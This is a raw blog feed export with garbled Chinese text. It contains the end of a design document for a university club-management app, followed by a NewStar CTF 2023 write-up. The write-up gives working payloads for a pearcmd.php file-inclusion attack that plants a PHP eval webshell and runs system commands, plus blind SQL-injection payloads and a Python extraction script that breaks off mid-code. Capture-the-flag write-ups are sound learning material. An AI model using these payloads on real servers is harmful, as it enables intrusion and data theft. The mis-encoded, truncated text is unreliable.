title="ç¤¾å›¢ç®¡ç†APP(iClub):"></a>ç¤¾å›¢ç®¡ç†APP(iClub):</h2><h3 id="iClubé¡¹ç›®èƒŒæ™¯åŠç®€ä»‹"><a href="#iClubé¡¹ç›®èƒŒæ™¯åŠç®€ä»‹" class="headerlink" title="iClubé¡¹ç›®èƒŒæ™¯åŠç®€ä»‹:"></a>iClubé¡¹ç›®èƒŒæ™¯åŠç®€ä»‹:</h3><p>å¤§å­¦é‡Œæœ‰å„ç§å„æ ·çš„ç¤¾å›¢ï¼Œä½†æ˜¯æ²¡æœ‰ä¸€ä¸ªé›†ä¸­çš„å¹³å°ç»¼åˆç®¡ç†è¿™äº›ç¤¾å›¢ä¿¡æ¯ï¼Œå› æ­¤å­¦ç”Ÿä¹Ÿå¾ˆéš¾å…¨é¢äº†è§£åˆ°å­¦æ ¡çš„ç¤¾å›¢ä»¥åŠç¤¾å›¢æ´»åŠ¨ã€‚å› æ­¤æœ¬é¡¹ç›®é¢å‘å¯¹è±¡ä¸ºå¤§å­¦å…¨ä½“å­¦ç”Ÿï¼Œå®ç°æ ¡å›­ç¤¾å›¢ç®¡ç†åŠŸèƒ½ï¼Œä¾‹å¦‚æ£€ç´¢æ ¡å†…æ‰€æœ‰ç¤¾å›¢ã€ç”³è¯·åŠ å…¥ï¼Œå‚åŠ ç¤¾å›¢æ´»åŠ¨ç­‰ã€‚</p><h3 id="éœ€æ±‚åˆ†æ"><a href="#éœ€æ±‚åˆ†æ" class="headerlink" title="éœ€æ±‚åˆ†æ:"></a>éœ€æ±‚åˆ†æ:</h3><h4 id="éç¤¾é•¿å­¦ç”Ÿ"><a href="#éç¤¾é•¿å­¦ç”Ÿ" class="headerlink" title="éç¤¾é•¿å­¦ç”Ÿ:"></a>éç¤¾é•¿å­¦ç”Ÿ:</h4><p>1.æ ¡å†…æ‰€æœ‰å­¦ç”Ÿè´¦å·å¯†ç å·²æ ¹æ®å­¦å·åˆå§‹åŒ–ï¼Œæ— éœ€æ³¨å†Œï¼Œç›´æ¥ç™»å½•ã€‚</p><p>2.éç¤¾é•¿å­¦ç”Ÿå¯ä»¥ä¿®æ”¹è‡ªå·±çš„åŸºæœ¬ä¿¡æ¯ï¼ˆå¯†ç ã€æ˜µç§°ã€æ‰‹æœºå·ã€å¤´åƒç­‰ç­‰ä¿¡æ¯ï¼‰ã€‚</p><p>3.éç¤¾é•¿å­¦ç”Ÿå¯ä»¥æŸ¥è¯¢æ‰€æœ‰ç¤¾å›¢çš„åŸºæœ¬ä¿¡æ¯ã€å·²ç»åŠ å…¥çš„ç¤¾å›¢ã€‚</p><p>4.éç¤¾é•¿å­¦ç”Ÿå¯ä»¥å¡«å†™ç¤¾å›¢ç”³è¯·è¡¨ï¼Œç¤¾é•¿å®¡æ ¸é€šè¿‡åå¯æˆä¸ºç¤¾å‘˜ã€‚</p><p>5.éç¤¾é•¿å­¦ç”Ÿå¯ä»¥æŸ¥è¯¢æ‰€æœ‰ç¤¾å›¢å‘å¸ƒçš„æ´»åŠ¨ã€å·²ç»æŠ¥åçš„æ´»åŠ¨ï¼ŒæŠ¥åç¬¦åˆæ¡ä»¶çš„æ´»åŠ¨ã€‚</p><p>6.éç¤¾é•¿å­¦ç”Ÿå¯ä»¥æ¥æ”¶ç›¸å…³æ´»åŠ¨ã€ç¤¾å›¢çš„é€šçŸ¥ã€‚</p><p>7.éç¤¾é•¿å­¦ç”Ÿå¯ä»¥åœ¨ç•™è¨€æ¿ç•™è¨€å¹¶æŸ¥çœ‹ç•™è¨€æ¿æ‰€æœ‰å†…å®¹ã€æˆ‘çš„ç•™è¨€ä»¥åŠè¯„è®ºã€‚</p><h4 id="ç¤¾é•¿å­¦ç”Ÿ"><a href="#ç¤¾é•¿å­¦ç”Ÿ" class="headerlink" title="ç¤¾é•¿å­¦ç”Ÿ:"></a>ç¤¾é•¿å­¦ç”Ÿ:</h4><p>1.ç¤¾é•¿å­¦ç”Ÿæ˜¯ç‰¹æ®Šçš„æ™®é€šå­¦ç”Ÿï¼Œæ‹¥æœ‰æ™®é€šå­¦ç”Ÿçš„æ‰€æœ‰åŠŸèƒ½ã€‚</p><p>2.ç¤¾å›¢ã€ç¤¾é•¿ä¿¡æ¯ç”±åå°ç®¡ç†å‘˜ç®¡ç†ã€‚</p><p>3.ç¤¾é•¿å¯ä»¥ä¿®æ”¹æœ¬ç¤¾å›¢åŸºæœ¬ä¿¡æ¯ï¼ˆåç§°ã€Logoã€ç¤¾å›¢ç®€ä»‹ç­‰ï¼‰ã€‚</p><p>4.ç¤¾é•¿å¯ä»¥ç®¡ç†æœ¬ç¤¾å›¢æ´»åŠ¨ï¼ˆå‘å¸ƒæ´»åŠ¨ã€ä¿®æ”¹æ´»åŠ¨ä¿¡æ¯ã€åˆ é™¤æ´»åŠ¨ï¼‰ã€‚</p><p>5.ç¤¾é•¿å¯ä»¥ç®¡ç†æœ¬ç¤¾å›¢ç¤¾å‘˜ï¼ˆå®¡æ ¸å…¥ç¤¾ç”³è¯·ã€åˆ é™¤ç¤¾å‘˜ã€æŸ¥çœ‹ç¤¾å‘˜ä¿¡æ¯ï¼‰ã€‚</p><p>6.ç¤¾é•¿å¯ä»¥ç®¡ç†æœ¬ç¤¾å›¢é€šçŸ¥ï¼ˆå‘å¸ƒé€šçŸ¥ï¼Œåˆ é™¤é€šçŸ¥ï¼‰ã€‚</p><p>7.ç¤¾é•¿å¯ä»¥å°†ç¤¾é•¿èŒä½è½¬è®©ç»™æŸç¤¾å‘˜ã€‚</p><h4 id="åå°ç®¡ç†å‘˜"><a href="#åå°ç®¡ç†å‘˜" class="headerlink" title="åå°ç®¡ç†å‘˜:"></a>åå°ç®¡ç†å‘˜:</h4><ol><li>åå°ç®¡ç†å‘˜è¿›è¡Œå­¦ç”Ÿã€ç¤¾å›¢çš„å¢ã€åˆ ã€‚</li><li>åå°ç®¡ç†å‘˜å®¡æ‰¹ç¤¾é•¿å‘å¸ƒçš„æ´»åŠ¨æ˜¯å¦é€šè¿‡ã€‚</li><li>åå°ç®¡ç†å‘˜å¯ä»¥ä¿®æ”¹ç¤¾é•¿ã€ç¤¾å›¢ä¿¡æ¯ï¼ˆå¯¹æ•°æ®åº“è¿›è¡Œç›´æ¥æ“ä½œï¼‰ã€‚</li></ol><h3 id="ç”¨ä¾‹å›¾"><a href="#ç”¨ä¾‹å›¾" class="headerlink" title="ç”¨ä¾‹å›¾:"></a>ç”¨ä¾‹å›¾:</h3><p>æ ¹æ®è½¯ä»¶éœ€æ±‚å’ŒåŸå‹å›¾åˆ¶ä½œç»˜åˆ¶äº†ä»¥ä¸‹ç”¨ä¾‹å›¾ï¼ˆä¸ºäº†æ›´åŠ æ¸…æ™°å±•ç¤ºå°†è½¯ä»¶çš„ä¸‰ä¸ªä¸»ä½“åŠŸèƒ½åˆ†ä¸ºä¸‰ä¸ªç³»ç»Ÿç»˜åˆ¶ï¼‰ï¼š</p><h4 id="ç¤¾å›¢ç®¡ç†ç”¨ä¾‹"><a href="#ç¤¾å›¢ç®¡ç†ç”¨ä¾‹" class="headerlink" title="ç¤¾å›¢ç®¡ç†ç”¨ä¾‹:"></a>ç¤¾å›¢ç®¡ç†ç”¨ä¾‹:</h4><p><img src="/images/2023_11_20_second_milestone/wps7.jpg" alt="img"> </p><h4 id="æ´»åŠ¨ç®¡ç†ç”¨ä¾‹"><a href="#æ´»åŠ¨ç®¡ç†ç”¨ä¾‹" class="headerlink" title="æ´»åŠ¨ç®¡ç†ç”¨ä¾‹:"></a>æ´»åŠ¨ç®¡ç†ç”¨ä¾‹:</h4><p><img src="/images/2023_11_20_second_milestone/wps8.jpg" alt="img"> </p><h4 id="ç”¨æˆ·èµ„æ–™ç”¨ä¾‹"><a href="#ç”¨æˆ·èµ„æ–™ç”¨ä¾‹" class="headerlink" title="ç”¨æˆ·èµ„æ–™ç”¨ä¾‹:"></a>ç”¨æˆ·èµ„æ–™ç”¨ä¾‹:</h4><p><img src="/images/2023_11_20_second_milestone/wps9.jpg" alt="img"> </p><h3 id="ç±»å›¾-1"><a href="#ç±»å›¾-1" class="headerlink" title="ç±»å›¾:"></a>ç±»å›¾:</h3><p><img src="/images/2023_11_20_second_milestone/wps10.jpg" alt="img"> </p><h3 id="æ•°æ®æµå›¾"><a href="#æ•°æ®æµå›¾" class="headerlink" title="æ•°æ®æµå›¾:"></a>æ•°æ®æµå›¾:</h3><p><img src="/images/2023_11_20_second_milestone/wps1.png" alt="img"></p><p>åˆå§‹ç¤¾å›¢ä¿¡æ¯ç”±åå°ç®¡ç†å‘˜æä¾›</p><p>æ‰€æœ‰å­¦ç”Ÿåˆå§‹åŒ–ä¸ªäººä¿¡æ¯ç”±åå°ç®¡ç†å‘˜åˆå§‹åŒ–</p><p>ç¤¾é•¿æ‹¥æœ‰æ™®é€šå­¦ç”Ÿçš„æ‰€æœ‰çš„åŠŸèƒ½ï¼Œéç¤¾é•¿ç™»é™†ä¹‹åæ²¡æœ‰ç¤¾å›¢ç®¡ç†åŠŸèƒ½ï¼Œæ‰€æœ‰äººå¯å‘å¸ƒå’ŒæŸ¥çœ‹å¸–å­ã€è¯„è®º</p><h3 id="APPç”¨ä¾‹é¡ºåºå›¾"><a href="#APPç”¨ä¾‹é¡ºåºå›¾" class="headerlink" title="APPç”¨ä¾‹é¡ºåºå›¾:"></a>APPç”¨ä¾‹é¡ºåºå›¾:</h3><p>æ™®é€šå­¦ç”Ÿé€šè¿‡æ°¸å’Œä¿¡æ¯ä¿®æ”¹é¡µé¢è¾“å…¥æ–°ä¿®æ”¹çš„ä¿¡æ¯å†é€šè¿‡ç”¨æˆ·idæŸ¥è¯¢ç”¨æˆ·è¡¨å¹¶å¯¹ç”¨æˆ·è¡¨è¿›è¡Œä¿®æ”¹</p><p><img src="/images/2023_11_20_second_milestone/wps2-1700443236234-18.jpg" alt="img"> </p><p>ç¤¾é•¿é€šè¿‡æ°¸å’Œä¿¡æ¯ä¿®æ”¹é¡µé¢è¾“å…¥æ–°ä¿®æ”¹çš„ä¿¡æ¯å†é€šè¿‡ç”¨æˆ·idæŸ¥è¯¢ç”¨æˆ·è¡¨å¹¶å¯¹ç”¨æˆ·è¡¨è¿›è¡Œä¿®æ”¹</p><p><img src="/images/2023_11_20_second_milestone/wps3-1700443236234-19.jpg" alt="img"> </p><p>æ™®é€šå­¦ç”Ÿé€šè¿‡åŠ å…¥ç¤¾å›¢é¡µé¢åŠ å…¥ç¤¾å›¢ï¼Œè·å–ç¤¾å›¢ä¸ç”¨æˆ·idå¹¶é€šè¿‡å…¶ä¿®æ”¹ç¤¾å›¢è¡¨å’Œç”¨æˆ·è¡¨å®ŒæˆåŠ å…¥ç¤¾å›¢è¿™ä¸€è¡Œä¸º</p><p><img src="/images/2023_11_20_second_milestone/wps4-1700443236234-20.jpg" alt="img"> </p><p>æ™®é€šå­¦ç”Ÿé€šè¿‡åŠ å…¥çš„ç¤¾å›¢æŸ¥çœ‹é¡µé¢æŸ¥çœ‹åŠ å…¥ç¤¾å›¢ï¼Œé€šè¿‡åŠ å…¥ç¤¾å›¢çš„idæŸ¥è¯¢ç¤¾å›¢è¡¨å¹¶è¿”å›æŸ¥è¯¢ä¿¡æ¯</p><p><img src="/images/2023_11_20_second_milestone/wps5-1700443236234-21.jpg" alt="img"> </p><p>æ™®é€šå­¦ç”Ÿé€šè¿‡ç¤¾å›¢æŸ¥çœ‹é¡µé¢æŸ¥çœ‹ç¤¾å›¢ï¼Œé€šè¿‡ç­›é€‰æ¡ä»¶ä¸æœç´¢å…³é”®è¯æŸ¥è¯¢ç¤¾å›¢è¡¨å¹¶è¿”å›æŸ¥è¯¢ä¿¡æ¯</p><p><img src="/images/2023_11_20_second_milestone/wps6-1700443236234-22.jpg" alt="img"> </p><p>ç¤¾é•¿é€šè¿‡æŸ¥çœ‹ç®¡ç†çš„ç¤¾å›¢é¡µé¢æŸ¥çœ‹æ‰€ç®¡ç†ç¤¾å›¢ï¼Œé€šè¿‡ç”¨æˆ·idæŸ¥è¯¢ç”¨æˆ·è¡¨åé€šè¿‡è¿”å›è¡¨è·å–å…¶æ‰€ç®¡ç†çš„ç¤¾å›¢idï¼Œä¹‹ååœ¨ç”¨å…¶æŸ¥è¯¢ç¤¾å›¢è¡¨æ´»åŠ¨æ‰€ç®¡ç†ç¤¾å›¢çš„ä¿¡æ¯</p><p><img src="/images/2023_11_20_second_milestone/wps7-1700443236234-23.jpg" alt="img"> </p><p>ç¤¾é•¿é€šè¿‡ç¤¾é•¿è½¬è®©é¡µé¢è½¬è®©ç¤¾é•¿ï¼Œè·å–ç”¨æˆ·ä¸ç¤¾å›¢çš„idåä½¿ç”¨å…¶ä¿®æ”¹ç¤¾å›¢è¡¨å’Œç”¨æˆ·è¡¨çš„çš„ä¿¡æ¯å®Œæˆç¤¾é•¿è½¬è®©</p><p><img src="/images/2023_11_20_second_milestone/wps8-1700443236235-24.jpg" alt="img"> </p><p>æ™®é€šå­¦ç”Ÿé€šè¿‡æ´»åŠ¨æŠ¥åé¡µé¢æŠ¥åæ´»åŠ¨ï¼Œé€šè¿‡è·å–çš„ç”¨æˆ·ä¸æ´»åŠ¨idæŸ¥è¯¢æ´»åŠ¨è¡¨å’Œç”¨æˆ·è¡¨ä¿®æ”¹å…¶ä¿¡æ¯å®ŒæˆæŠ¥åæ´»åŠ¨</p><p><img src="/images/2023_11_20_second_milestone/wps9-1700443236235-25.jpg" alt="img"> </p><p>æ™®é€šå­¦ç”Ÿé€šè¿‡æ´»åŠ¨æŸ¥çœ‹é¡µé¢æŸ¥çœ‹æ´»åŠ¨ï¼Œé€šè¿‡ç­›é€‰æ¡ä»¶ä¸æœç´¢å…³é”®è¯æŸ¥è¯¢æ´»åŠ¨è¡¨å¹¶è¿”å›æŸ¥è¯¢ä¿¡æ¯</p><p><img src="/images/2023_11_20_second_milestone/wps10-1700443236235-26.jpg" alt="img"> </p><p>æ™®é€šå­¦ç”Ÿé€šè¿‡æ´»åŠ¨æŠ¥åæŸ¥çœ‹é¡µé¢æŸ¥çœ‹æŠ¥åçš„æ´»åŠ¨ï¼Œé€šè¿‡æŠ¥åæ´»åŠ¨çš„idæŸ¥è¯¢ç¤¾å›¢è¡¨å¹¶è¿”å›æŸ¥è¯¢ä¿¡æ¯</p><p><img src="/images/2023_11_20_second_milestone/wps11.jpg" alt="img"> </p><p>ç¤¾é•¿é€šè¿‡æ´»åŠ¨åˆ›å»ºé¡µé¢åˆ›å»ºæ´»åŠ¨ï¼Œç¤¾é•¿è¾“å…¥æ´»åŠ¨ä¿¡æ¯åé€šè¿‡å…¶ä¿¡æ¯ä¿®æ”¹æ´»åŠ¨è¡¨å®Œæˆåˆ›å»ºæ´»åŠ¨</p><p><img src="/images/2023_11_20_second_milestone/wps12.jpg" alt="img"> </p><p>ç¤¾é•¿é€šè¿‡æ´»åŠ¨æŠ¥åä¿¡æ¯æŸ¥è¯¢ç•Œé¢æŸ¥è¯¢æ´»åŠ¨æŠ¥åä¿¡æ¯ï¼Œé¦–å…ˆè·å–å…¶æ‰€ç®¡ç†çš„ç¤¾å›¢idï¼Œå¹¶é€šè¿‡å…¶å–œæ¬¢å¯»ç¤¾å›¢è¡¨ï¼Œé€šè¿‡å…¶è¿”å›è¡¨çš„ä¿¡æ¯è·å–æ´»åŠ¨idï¼Œå¹¶åˆ©ç”¨å…¶æŸ¥è¯¢æ´»åŠ¨æŠ¥åè¡¨ï¼Œå¹¶è¿”å›æ´»åŠ¨ä¿¡æ¯</p><p><img src="/images/2023_11_20_second_milestone/wps13.jpg" alt="img"> </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WP</title>
    <link href="/2023/11/03/2023-11-3-newstarweek3/"/>
    <url>/2023/11/03/2023-11-3-newstarweek3/</url>
    
    <content type="html"><![CDATA[<h1 id="Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WP"><a href="#Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WP" class="headerlink" title="Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WP"></a>Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WP</h1><h2 id="Include-ğŸ"><a href="#Include-ğŸ" class="headerlink" title="Include ğŸ"></a>Include ğŸ</h2><p>ä»£ç å®¡è®¡:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-comment">//å°†æ–‡ä»¶åŒ…å«æ¼æ´çš„ä¼ªåè®®banæ‰äº†</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<br>        <span class="hljs-comment">//æç¤ºphpinfo.phpæ–‡ä»¶</span><br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>        <span class="hljs-comment"># Something in phpinfo.php!</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>è®¿é—®phpinfo.php,å¹¶åœ¨å“åº”å†…å®¹ä¸­å¯»æ‰¾flagï¼š<br><img src="/images/2023-11-3-newstar-3/image-20231009114740035.png" alt="image-20231009114740035"></p><p>å¯»æ‰¾ä¸€ä¸‹register_argc_argvï¼š</p><p><img src="/images/2023-11-3-newstar-3/image-20231009114850048.png" alt="image-20231009114850048"></p><p>å‘ç°register_argc_argvå¤„äºå¼€å¯çŠ¶æ€,æ‰€ä»¥å¯ä»¥[åˆ©ç”¨pearcmd.phpæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFI):<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨bpä¸Šä¼ payload,ç›´æ¥ç”¨æµè§ˆå™¨ä¸Šä¼ ä¼šå¯¼è‡´æˆ‘ä»¬ä¼ å…¥çš„å†…å®¹è¢«urlç¼–ç åŒ–ï¼Œå¯¼è‡´phpè¯­è¨€å˜å½¢</p><p><img src="/images/2023-11-3-newstar-3/image-20231009115202206.png" alt="image-20231009115202206"></p><p>æˆ‘ä»¬çš„æ–‡ä»¶è¢«æˆåŠŸåˆ›å»ºåœ¨&#x2F;tmpç›®å½•ä¸‹,ä¸ºtest.php</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">?file=/tmp/test.php<br>=&gt;ç”±äºåé¢å®ƒç»™æˆ‘ä»¬è‡ªåŠ¨åŠ ä¸Šphp,æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¼ å…¥æ–‡ä»¶åå³å¯<br>?file=/tmp/test<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231009115338558.png" alt="image-20231009115338558"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>cmd=system(&quot;ls /&quot;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231009115429049.png" alt="image-20231009115429049"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>cmd=system(&quot;cat /flag&quot;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231009115526916.png" alt="image-20231009115526916"></p><h2 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h2><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=TMP0919&#x27; GROUP BY 5 -- &#x27;<br></code></pre></td></tr></table></figure><p>å¾—åˆ°å­—æ®µæ•°é‡ä¸º5</p><p>ä½¿ç”¨ç›²æ³¨ï¼š<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=TMP0919&#x27;anD(1=1) -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010205748567.png" alt="image-20231010205748567"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=TMP0919&#x27;anD(1=2) -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010215505760.png" alt="image-20231010215505760"></p><p>å­˜åœ¨sqlæ³¨å…¥ç›²æ³¨ç‚¹</p><p>çˆ†è¡¨:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+0%2C1)%2C1%2C1))&gt;102+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://29b31bd5-9259-4782-a9da-e797bb66785d.node4.buuoj.cn:81/?id=&#x27;</span><br><span class="hljs-comment"># table_lenå­˜å‚¨æ¯å¼ è¡¨çš„é•¿åº¦</span><br>table_len = [<span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>]<br><span class="hljs-comment"># table_nameå­˜å‚¨æ¯å¼ è¡¨çš„åå­—</span><br>table_name = []<br><span class="hljs-comment"># indexå­˜å‚¨ç°åœ¨å¤„ç†çš„æ˜¯ç¬¬index+1å¼ è¡¨</span><br>index = <span class="hljs-number">0</span><br><span class="hljs-comment"># ç”±äºè·å–çš„æ˜¯æ‰€æœ‰è¡¨åæ€»å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥åªè¦éå†ä¸€æ¬¡å³å¯</span><br><span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">1</span>):<br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-comment"># nè¡¨ç¤ºå½“å‰å¤„ç†çš„è¡¨æ‰€å¤„ç†çš„æ˜¯ç¬¬nä¸ªå­—ç¬¦</span><br>    n = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (n &lt;= table_len[index]):<br>        <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>            <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(index, n, tmp)</span><br>            payload2 = <span class="hljs-string">&quot;TMP0919&#x27;anD(asCii(suBstr((sElect(GROUP_CONCAT(TABLE_NAME))frOm(infOrmation_schema.tables)wHere(TABLE_SCHEMA=database())),&#123;&#125;,1))&gt;&#123;&#125;) -- &#x27;&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>            <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>            <span class="hljs-comment"># print(url + payload2)</span><br>            <span class="hljs-comment"># print()</span><br>            r = requests.get(url + payload2)<br>            time.sleep(<span class="hljs-number">0.05</span>)<br>            <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>            true_text = <span class="hljs-string">&quot;Physics&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>        name = name + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>        n = n + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># å­˜å‚¨è¯¥è¡¨çš„è¡¨å</span><br>    table_name.append(name)<br>    <span class="hljs-comment"># æ‰“å°è¯¥è¡¨çš„è¡¨å</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç¬¬&#123;&#125;å¼ è¡¨çš„åå­—ä¸º&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(index+<span class="hljs-number">1</span>, name))<br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªè¡¨</span><br>    index = index + <span class="hljs-number">1</span><br><span 